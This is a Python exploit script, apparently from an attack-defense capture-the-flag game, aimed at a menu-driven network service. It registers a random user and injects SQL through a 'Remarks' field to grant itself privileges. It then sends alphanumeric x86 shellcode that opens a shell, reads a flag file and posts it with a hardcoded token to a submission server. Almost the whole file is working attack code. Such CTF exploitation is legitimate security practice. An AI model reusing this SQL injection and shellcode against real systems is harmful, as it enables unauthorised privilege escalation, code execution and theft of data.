#pay = '2\nmemeda\nmemeda\n'
#pay += '5\n'
import socket
import struct
import time
import telnetlib
import random
import sys

def submit(flag):
	import requests
	import json
	token = "WRr7S6DHrH7tuF4F"
	url = 'http://10.10.10.10/submit'
	headers = {'content-type': 'application/json'}
	print flag
	postData = { 'flag': flag, 'token': token }
	r = requests.post(url, data = json.dumps(postData), headers=headers)
	print r.text

def userr():
    x = ''
    for i in range(0, 13):
        x += str(int(random.random() * 10))
    return x

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

ppp = userr()

host = sys.argv[1]
port = 7156

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

readuntil(f, 'Option: ')
f.write('1\n')
readuntil(f, 'Username: ')
f.write(ppp + '\n')
readuntil(f, 'Password: ')
f.write(ppp + '\n')
readuntil(f, 'password: ')
f.write(ppp + '\n')

readuntil(f, 'Option: ')
f.write('2\n')
readuntil(f, 'Username: ')
f.write(ppp + '\n')
readuntil(f, 'Password: ')
f.write(ppp + '\n')

readuntil(f, 'Option: ')
f.write('1\n')
readuntil(f, 'only): ')
f.write('x\n')
readuntil(f, 'Remarks: ')
f.write("x'); update user set identity=1 where name='" + ppp + "'; -- -\n")

readuntil(f, 'Option: ')
f.write('6\n')

s.close()
f.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

readuntil(f, 'Option: ')
f.write('2\n')
readuntil(f, 'Username: ')
f.write(ppp + '\n')
readuntil(f, 'Password: ')
f.write(ppp + '\n')

readuntil(f, 'Option: ')
f.write('5\n')

readuntil(f, ':\n')

#pay = '1\nmemeda\nmemeda\nmemeda\n'
#pay += '2\nmemeda\nmemeda\n'
#pay += '1\nx\n'
#pay += "x'); update user set identity=1 where name='memeda'; -- -\n"
#pay += '6\n'
#pay += '2\nmemeda\nmemeda\n'
#pay += '5\n'

x = (
"\x53"             #push %ebx
"\x58"		   #pop %eax
"\x54"		   #push %esp
"\x5f"		   #pop %edi
"\x66\x35\x47\x55" #xorl $0x5540, %ax
"\x66\x35\x38\x55" #xorl $0x5531, %ax
"\x50"	 	   #push %eax
"\x5c"		   #pop %esp
"\x6a\x30"         #pushb $0x30       */
"\x58"             #pop %eax          */
"\x34\x30"         #xorb $0x30, %al   */
"\x50"             #push %eax         */
"\x5a"             #pop %edx          */
"\x48"             #dec %eax          */
"\x66\x35\x41\x30" #xorl $0x3041, %ax */
"\x66\x35\x73\x4f" #xorl $0x4f73, %ax */
"\x50"             #push %eax         */
"\x52"             #pushl %edx        */
"\x58"             #pop %eax          */
"\x684J4A"         #pushl "4J4A"      */
"\x68PSTY"         #pushl "PSTY"      */
"\x68UVWa"         #pushl "UVWa"      */
"\x68QRPT"         #pushl "QRPT"      */
"\x68PTXR"         #pushl "PTXR"      */
"\x68binH"         #pushl "binH"      */
"\x68IQ50"         #pushl "IQ50"      */
"\x68shDY"         #pushl "shDY"      */
"\x68Rha0"
#"\x57"		   #push %edi
#"\x5c"		   #pop %esp
)
#print buf
pay = x
pay += ("\x46" * 9) #inc %esi
f.write(pay + '\n')

f.write("cat /home/flags/bluemine/flag\n")
flag = f.read(1024)

flag = flag.replace('\n', '').replace(' ', '')

submit(flag)


